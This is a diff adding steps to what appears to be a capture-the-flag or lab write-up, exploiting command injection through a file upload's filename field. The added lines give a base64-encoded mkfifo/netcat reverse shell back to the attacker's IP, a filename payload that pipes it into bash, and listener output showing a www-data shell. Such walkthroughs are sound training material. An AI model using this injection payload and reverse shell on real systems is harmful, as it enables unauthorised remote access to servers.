@@ -87,4 +87,26 @@ Interesting:
 its enough to upload one image and save it into burpsuite repeater so you can edit the filename field within the form-data,
 to confirm the vulnerability was exploitable i used `filename="echo 'curl 10.10.14.70:8000' | bash |"` which did indeed call back to my host.
 
+if we add any other pipes to the command e.g. > the command will fail to run, however we can pass a b64 encoded command, pipe it to the base64 -d command to decode and pipe the result into bash to run it, which avoids the other pipes breaking it.
 
+```
+curl 10.10.14.70:8000/?d=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.70 4444 >/tmp/f)
+b64 encoded:
+Y3VybCAxMC4xMC4xNC43MDo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzAgNDQ0NCA+L3RtcC9mKQ==
+
+filename="echo 'Y3VybCAxMC4xMC4xNC43MDo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzAgNDQ0NCA+L3RtcC9mKQ==' | base64 -d | bash |"
+
+```
+
+```
+nc -lvnp 4444                                            
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.197 33714
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+
+```
+
+We have internal access to the box!
